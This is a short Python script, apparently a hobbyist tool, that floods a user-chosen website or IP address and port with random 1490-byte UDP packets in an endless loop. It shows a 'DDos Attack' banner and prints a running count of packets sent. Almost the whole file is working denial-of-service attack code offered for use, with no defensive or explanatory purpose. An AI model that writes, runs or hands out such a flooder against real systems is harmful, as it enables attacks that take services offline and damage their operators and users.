import socket
import os
import sys
import random
import time
from datetime import datetime


#string colors
OKBLUE = '\033[94m'
ENDC = '\033[0m'
BOLD = '\033[1m'
WARNING = '\033[93m'
FAIL = '\033[91m'

#initialise the socket to use IPv4 & UDP protocole
sockt = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
os.system("figlet 'DDos Attack'")

victim = input("enter 'w' if your victim is a website, and 'l' if it's an electronic device : ")
if victim == 'w':
    host = input("Website you want to DDos: ")
    ip = socket.gethostbyname(host)
elif victim == 'l':
    ip = input("IP you want to DDos: ")
else :
    print("error !")
    exit

port = int(input("Port you want to attack: "))
pers_msg = input("Enter your personnal message or signatur if you wish: ")


os.system("clear")
os.system("figlet 'DDos Attack starting ...'")

print(BOLD+OKBLUE+"preparing the attack on the adress IP:",ip+ENDC+ENDC)
time.sleep(5)
sent = 0

while True:
    sockt.sendto(bytes,(ip,port))
    #sockt.send(str(pers_msg).encode)
    sent +=1
    print(BOLD+"number of requests sent:",FAIL+str(sent)+ENDC+ENDC)
